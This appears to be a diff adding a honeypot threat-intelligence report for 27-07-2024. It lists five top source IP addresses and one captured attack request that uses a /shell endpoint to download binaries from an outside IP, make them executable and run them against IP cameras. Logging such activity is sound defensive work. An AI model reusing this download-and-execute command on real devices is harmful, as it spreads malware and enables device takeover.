@@ -1,0 +1,16 @@
+Top 5 IPs for 27-07-2024 :
+
+218.161.112.80
+183.81.169.238
+210.6.214.2
+34.82.239.83
+103.127.8.226
+
+Malware Observed:
+
+None observed
+
+
+Commands/exploits observed:
+
+/shell?cd+/tmp;rm+arm+arm7;wget+http:/\\/193.168.173.217/Aqua.arm7;chmod+777+Aqua.arm7;./Aqua.arm7+ipcams;wget+http:/\\/193.168.173.217/Aqua.arm;chmod+777+Aqua.arm;./Aqua.arm+ipcams
